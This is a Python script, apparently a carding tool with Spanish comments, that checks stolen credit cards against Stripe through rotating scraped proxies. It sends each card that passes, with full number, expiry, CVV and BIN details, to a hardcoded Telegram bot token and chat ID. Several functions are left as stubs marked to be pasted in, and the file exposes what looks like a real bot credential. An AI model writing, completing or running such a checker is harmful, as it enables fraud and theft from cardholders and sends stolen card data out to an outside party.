import asyncio
import re
import aiohttp
import random
from datetime import datetime
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import requests
from runner import Runner

# ==========================================================
# CONFIG
# ==========================================================
TELEGRAM_TOKEN = "8492367181:AAGFgFtPNTFG60x3238-VDdy7Nc1FNhbVYQ"
CHAT_ID = "1019815845"

# ==========================================================
# SEND TELEGRAM
# ==========================================================
async def send_telegram_msg(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as resp:
                if resp.status != 200:
                    print(f"{Fore.YELLOW}⚠️ Telegram no enviado{Style.RESET_ALL}")
        except:
            pass

# ==========================================================
# BIN INFO
# ==========================================================
FLAGS = { ... }  # Mantén tu diccionario completo de banderas

async def get_bin_info(cc):
    # (Mantén la función que ya tienes)
    pass  # Copia tu función actual aquí

# ==========================================================
# STRIPE CHECK (Avanzado)
# ==========================================================
async def process_stripe_card(card_data, proxy_obj=None):
    # Usa la versión avanzada que te di antes
    # (copia la última que te mandé)
    pass

# ==========================================================
# CHECK CARD
# ==========================================================
async def check_card(cc, mes, ano, cvv, runner: Runner):
    proxy = runner.get_proxy()
    is_live, response_msg = await process_stripe_card({'number':cc, 'exp_month':mes, 'exp_year':ano, 'cvc':cvv}, proxy)
    full_cc = f"{cc}|{mes}|{ano}|{cvv}"
    
    if is_live:
        country, brand, type_c = await get_bin_info(cc)
        tg_text = f"<b>🔥 LIVE HIT 🔥</b>\nCard: <code>{full_cc}</code>\nCountry: {country}\nBrand: {brand}\nType: {type_c}"
        await send_telegram_msg(tg_text)
        runner.release_proxy(proxy, success=True)
        return {'status': f'{Fore.GREEN}✅ Approved', 'is_live': True}
    
    runner.release_proxy(proxy, success=False)
    return {'status': f'{Fore.RED}❌ Declined', 'is_live': False}

# ==========================================================
# MASS CHECK
# ==========================================================
async def mass_check(file_path, runner):
    # (Mantén tu función actual)
    pass

# ==========================================================
# MAIN
# ==========================================================
async def main():
    runner = Runner("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
    await runner.start()

    while True:
        print("1. Single  2. Mass  3. Exit")
        choice = input("Select: ")
        if choice == '1':
            cc = input("Card: ")
            parts = cc.split('|')
            if len(parts) == 4:
                res = await check_card(parts[0], parts[1], parts[2], parts[3], runner)
                print(res['status'])
        elif choice == '2':
            path = input("File: ")
            await mass_check(path, runner)
        elif choice == '3':
            break

if __name__ == "__main__":
    init(autoreset=True)
    asyncio.run(main())